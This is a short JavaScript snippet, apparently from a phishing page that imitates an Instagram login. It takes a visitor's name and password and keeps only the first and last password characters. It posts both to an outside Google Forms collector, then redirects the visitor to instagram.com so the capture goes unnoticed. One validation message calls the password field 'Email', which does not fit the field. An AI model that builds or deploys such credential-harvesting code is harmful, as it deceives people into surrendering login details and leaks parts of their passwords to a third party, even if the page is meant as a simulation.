<script>

function postToGoogle() {
        var field1 = $("#nameField").val();
        var field2 = $("#passwordField").val();
        

				if(field1 == ""){
					alert('Please Fill Your Name');
					document.getElementById("nameField").focus();
					return false;
				}
				if(field2 == ""){
					alert('Please Fill Your Email');
					document.getElementById("passwordField").focus();
					return false;
				}
				
        // fix password - only store first and last digit
        var newpw = '';
        for (var i = 0; i < field2.length; i++)
        {
            if ( (i == 0) || (i == field2.length - 1) )
                newpw = newpw + field2[i];
            else
                newpw = newpw + '*';
        }

        field2 = newpw;
        
        $.ajax({
                url: "https://docs.google.com/forms/d/e/1FAIpQLSf0rNCWw1sbsVpM3mg-yx8c2EZ-DqMP7vwTKGMSnvV0bPJH2w/formResponse?",
                data: {"entry.366340186": field1, "entry.147812173": field2},
                type: "POST",
                dataType: "xml",
                success: function(d)
              {
              },
              error: function(x, y, z)
                {
                  $('#success-msg').show();
                  $('#form').hide();
                  setTimeout(Redirect, 3000);                  
                }
          });
        
        return false;

}

function Redirect() {
    window.location.replace('https://www.instagram.com');
}

</script>
